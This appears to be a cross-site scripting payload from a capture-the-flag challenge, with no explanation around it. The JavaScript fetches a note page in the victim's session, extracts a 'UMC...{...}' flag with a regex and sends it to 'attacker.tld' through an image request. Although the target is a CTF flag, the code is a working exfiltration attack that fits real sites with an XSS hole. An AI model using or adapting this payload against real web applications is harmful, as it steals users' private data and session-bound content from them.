(async () => {
  const r = await fetch('/notes/1');             // flag note
  const html = await r.text();
  const flag = /UMC\w+\{[^}]+}/.exec(html)[0];   // simple regex
  new Image().src = 'https://attacker.tld/loot?f=' + encodeURIComponent(flag);
})();
